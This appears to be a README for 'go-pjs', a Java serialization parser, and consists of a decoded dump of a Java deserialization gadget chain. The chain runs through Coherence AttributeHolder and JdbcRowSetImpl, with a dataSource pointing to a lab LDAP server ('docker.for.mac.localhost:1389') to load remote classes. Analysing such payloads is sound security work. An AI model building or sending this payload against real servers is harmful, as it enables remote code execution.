# go-pjs

```
STREAM_MAGIC - 0xac ed
STREAM_VERSION - 0x00 05
Contents
  TC_OBJECT - 0x73
    TC_CLASSDESC - 0x72
      className
        Length - 46 - 0x00 2e
        Value - com.tangosol.coherence.servlet.AttributeHolder - 0x636f6d2e74616e676f736f6c2e636f686572656e63652e736572766c65742e417474726962757465486f6c646572
      serialVersionUID - 0xcc 30 a4 78 3d ef 6a c1
      newHandle 0x00 7e 00 00
      classDescFlags - 0x0c - SC_EXTERNALIZABLE | SC_BLOCK_DATA
      fieldCount - 0 - 0x00 00
      classAnnotations
        TC_ENDBLOCKDATA - 0x78
      superClassDesc
        TC_NULL - 0x70
    newHandle 0x00 7e 00 01
    classdata
      com.tangosol.coherence.servlet.AttributeHolder
        objectAnnotation
          TC_BLOCKDATA - 0x77
            Length - 174 - 0xae
            Contents - 0x400a39636f6d2e74616e676f736f6c2e7574696c2e61676772656761746f722e546f704e41676772656761746f72245061727469616c526573756c740a89016f7261636c652e65636c697073656c696e6b2e636f686572656e63652e696e74656772617465642e696e7465726e616c2e7175657279696e672e46696c746572457874726163746f72010605353170776e0607636f6e6e656374060d736574436f6e6e656374696f6e02000000010b
          TC_OBJECT - 0x73
            TC_CLASSDESC - 0x72
              className
                Length - 29 - 0x00 1d
                Value - com.sun.rowset.JdbcRowSetImpl - 0x636f6d2e73756e2e726f777365742e4a646263526f77536574496d706c
              serialVersionUID - 0xce 26 d8 1f 49 73 c2 05
              newHandle 0x00 7e 00 02
              classDescFlags - 0x02 - SC_SERIALIZABLE
              fieldCount - 7 - 0x00 07
              Fields
                0:
                  Object - L - 0x4c
                  fieldName
                    Length - 4 - 0x00 04
                    Value - conn - 0x636f6e6e
                  className1
                    TC_STRING - 0x74
                      newHandle 0x00 7e 00 03
                      Length - 21 - 0x00 15
                      Value - Ljava/sql/Connection; - 0x4c6a6176612f73716c2f436f6e6e656374696f6e3b
                1:
                  Object - L - 0x4c
                  fieldName
                    Length - 13 - 0x00 0d
                    Value - iMatchColumns - 0x694d61746368436f6c756d6e73
                  className1
                    TC_STRING - 0x74
                      newHandle 0x00 7e 00 04
                      Length - 18 - 0x00 12
                      Value - Ljava/util/Vector; - 0x4c6a6176612f7574696c2f566563746f723b
                2:
                  Object - L - 0x4c
                  fieldName
                    Length - 2 - 0x00 02
                    Value - ps - 0x7073
                  className1
                    TC_STRING - 0x74
                      newHandle 0x00 7e 00 05
                      Length - 28 - 0x00 1c
                      Value - Ljava/sql/PreparedStatement; - 0x4c6a6176612f73716c2f507265706172656453746174656d656e743b
                3:
                  Object - L - 0x4c
                  fieldName
                    Length - 5 - 0x00 05
                    Value - resMD - 0x7265734d44
                  className1
                    TC_STRING - 0x74
                      newHandle 0x00 7e 00 06
                      Length - 28 - 0x00 1c
                      Value - Ljava/sql/ResultSetMetaData; - 0x4c6a6176612f73716c2f526573756c745365744d657461446174613b
                4:
                  Object - L - 0x4c
                  fieldName
                    Length - 6 - 0x00 06
                    Value - rowsMD - 0x726f77734d44
                  className1
                    TC_STRING - 0x74
                      newHandle 0x00 7e 00 07
                      Length - 37 - 0x00 25
                      Value - Ljavax/sql/rowset/RowSetMetaDataImpl; - 0x4c6a617661782f73716c2f726f777365742f526f775365744d65746144617461496d706c3b
                5:
                  Object - L - 0x4c
                  fieldName
                    Length - 2 - 0x00 02
                    Value - rs - 0x7273
                  className1
                    TC_STRING - 0x74
                      newHandle 0x00 7e 00 08
                      Length - 20 - 0x00 14
                      Value - Ljava/sql/ResultSet; - 0x4c6a6176612f73716c2f526573756c745365743b
                6:
                  Object - L - 0x4c
                  fieldName
                    Length - 15 - 0x00 0f
                    Value - strMatchColumns - 0x7374724d61746368436f6c756d6e73
                  className1
                    TC_REFERENCE - 0x71
                      Handle - 8257540 - 0x00 7e 00 04
              classAnnotations
                TC_ENDBLOCKDATA - 0x78
              superClassDesc
                TC_CLASSDESC - 0x72
                  className
                    Length - 27 - 0x00 1b
                    Value - javax.sql.rowset.BaseRowSet - 0x6a617661782e73716c2e726f777365742e42617365526f77536574
                  serialVersionUID - 0x43 d1 1d a5 4d c2 b1 e0
                  newHandle 0x00 7e 00 09
                  classDescFlags - 0x02 - SC_SERIALIZABLE
                  fieldCount - 21 - 0x00 15
                  Fields
                    0:
                      Int - I - 0x49
                      fieldName
                        Length - 11 - 0x00 0b
                        Value - concurrency - 0x636f6e63757272656e6379
                    1:
                      Boolean - Z - 0x5a
                      fieldName
                        Length - 16 - 0x00 10
                        Value - escapeProcessing - 0x65736361706550726f63657373696e67
                    2:
                      Int - I - 0x49
                      fieldName
                        Length - 8 - 0x00 08
                        Value - fetchDir - 0x6665746368446972
                    3:
                      Int - I - 0x49
                      fieldName
                        Length - 9 - 0x00 09
                        Value - fetchSize - 0x666574636853697a65
                    4:
                      Int - I - 0x49
                      fieldName
                        Length - 9 - 0x00 09
                        Value - isolation - 0x69736f6c6174696f6e
                    5:
                      Int - I - 0x49
                      fieldName
                        Length - 12 - 0x00 0c
                        Value - maxFieldSize - 0x6d61784669656c6453697a65
                    6:
                      Int - I - 0x49
                      fieldName
                        Length - 7 - 0x00 07
                        Value - maxRows - 0x6d6178526f7773
                    7:
                      Int - I - 0x49
                      fieldName
                        Length - 12 - 0x00 0c
                        Value - queryTimeout - 0x717565727954696d656f7574
                    8:
                      Boolean - Z - 0x5a
                      fieldName
                        Length - 8 - 0x00 08
                        Value - readOnly - 0x726561644f6e6c79
                    9:
                      Int - I - 0x49
                      fieldName
                        Length - 10 - 0x00 0a
                        Value - rowSetType - 0x726f7753657454797065
                    10:
                      Boolean - Z - 0x5a
                      fieldName
                        Length - 11 - 0x00 0b
                        Value - showDeleted - 0x73686f7744656c65746564
                    11:
                      Object - L - 0x4c
                      fieldName
                        Length - 3 - 0x00 03
                        Value - URL - 0x55524c
                      className1
                        TC_STRING - 0x74
                          newHandle 0x00 7e 00 0a
                          Length - 18 - 0x00 12
                          Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b
                    12:
                      Object - L - 0x4c
                      fieldName
                        Length - 11 - 0x00 0b
                        Value - asciiStream - 0x617363696953747265616d
                      className1
                        TC_STRING - 0x74
                          newHandle 0x00 7e 00 0b
                          Length - 21 - 0x00 15
                          Value - Ljava/io/InputStream; - 0x4c6a6176612f696f2f496e70757453747265616d3b
                    13:
                      Object - L - 0x4c
                      fieldName
                        Length - 12 - 0x00 0c
                        Value - binaryStream - 0x62696e61727953747265616d
                      className1
                        TC_REFERENCE - 0x71
                          Handle - 8257547 - 0x00 7e 00 0b
                    14:
                      Object - L - 0x4c
                      fieldName
                        Length - 10 - 0x00 0a
                        Value - charStream - 0x6368617253747265616d
                      className1
                        TC_STRING - 0x74
                          newHandle 0x00 7e 00 0c
                          Length - 16 - 0x00 10
                          Value - Ljava/io/Reader; - 0x4c6a6176612f696f2f5265616465723b
                    15:
                      Object - L - 0x4c
                      fieldName
                        Length - 7 - 0x00 07
                        Value - command - 0x636f6d6d616e64
                      className1
                        TC_REFERENCE - 0x71
                          Handle - 8257546 - 0x00 7e 00 0a
                    16:
                      Object - L - 0x4c
                      fieldName
                        Length - 10 - 0x00 0a
                        Value - dataSource - 0x64617461536f75726365
                      className1
                        TC_REFERENCE - 0x71
                          Handle - 8257546 - 0x00 7e 00 0a
                    17:
                      Object - L - 0x4c
                      fieldName
                        Length - 9 - 0x00 09
                        Value - listeners - 0x6c697374656e657273
                      className1
                        TC_REFERENCE - 0x71
                          Handle - 8257540 - 0x00 7e 00 04
                    18:
                      Object - L - 0x4c
                      fieldName
                        Length - 3 - 0x00 03
                        Value - map - 0x6d6170
                      className1
                        TC_STRING - 0x74
                          newHandle 0x00 7e 00 0d
                          Length - 15 - 0x00 0f
                          Value - Ljava/util/Map; - 0x4c6a6176612f7574696c2f4d61703b
                    19:
                      Object - L - 0x4c
                      fieldName
                        Length - 6 - 0x00 06
                        Value - params - 0x706172616d73
                      className1
                        TC_STRING - 0x74
                          newHandle 0x00 7e 00 0e
                          Length - 21 - 0x00 15
                          Value - Ljava/util/Hashtable; - 0x4c6a6176612f7574696c2f486173687461626c653b
                    20:
                      Object - L - 0x4c
                      fieldName
                        Length - 13 - 0x00 0d
                        Value - unicodeStream - 0x756e69636f646553747265616d
                      className1
                        TC_REFERENCE - 0x71
                          Handle - 8257547 - 0x00 7e 00 0b
                  classAnnotations
                    TC_ENDBLOCKDATA - 0x78
                  superClassDesc
                    TC_NULL - 0x70
            newHandle 0x00 7e 00 0f
            classdata
              javax.sql.rowset.BaseRowSet
                values
                  concurrency
                    (int)0 - 0x00 00 00 00
                  escapeProcessing
                    (boolean)false - 0x00
                  fetchDir
                    (int)0 - 0x00 00 00 00
                  fetchSize
                    (int)0 - 0x00 00 00 00
                  isolation
                    (int)0 - 0x00 00 00 00
                  maxFieldSize
                    (int)0 - 0x00 00 00 00
                  maxRows
                    (int)0 - 0x00 00 00 00
                  queryTimeout
                    (int)0 - 0x00 00 00 00
                  readOnly
                    (boolean)false - 0x00
                  rowSetType
                    (int)0 - 0x00 00 00 00
                  showDeleted
                    (boolean)false - 0x00
                  URL
                    (object)
                      TC_NULL - 0x70
                  asciiStream
                    (object)
                      TC_NULL - 0x70
                  binaryStream
                    (object)
                      TC_NULL - 0x70
                  charStream
                    (object)
                      TC_NULL - 0x70
                  command
                    (object)
                      TC_NULL - 0x70
                  dataSource
                    (object)
                      TC_STRING - 0x74
                        newHandle 0x00 7e 00 10
                        Length - 53 - 0x00 35
                        Value - ldap://docker.for.mac.localhost:1389/UpX34defineClass - 0x6c6461703a2f2f646f636b65722e666f722e6d61632e6c6f63616c686f73743a313338392f5570583334646566696e65436c617373
                  listeners
                    (object)
                      TC_NULL - 0x70
                  map
                    (object)
                      TC_NULL - 0x70
                  params
                    (object)
                      TC_NULL - 0x70
                  unicodeStream
                    (object)
                      TC_NULL - 0x70
              com.sun.rowset.JdbcRowSetImpl
                values
                  conn
                    (object)
                      TC_NULL - 0x70
                  iMatchColumns
                    (object)
                      TC_NULL - 0x70
                  ps
                    (object)
                      TC_NULL - 0x70
                  resMD
                    (object)
                      TC_NULL - 0x70
                  rowsMD
                    (object)
                      TC_NULL - 0x70
                  rs
                    (object)
                      TC_NULL - 0x70
                  strMatchColumns
                    (object)
                      TC_NULL - 0x70
          TC_BLOCKDATA - 0x77
            Length - 3 - 0x03
            Contents - 0x000000
          TC_ENDBLOCKDATA - 0x78

```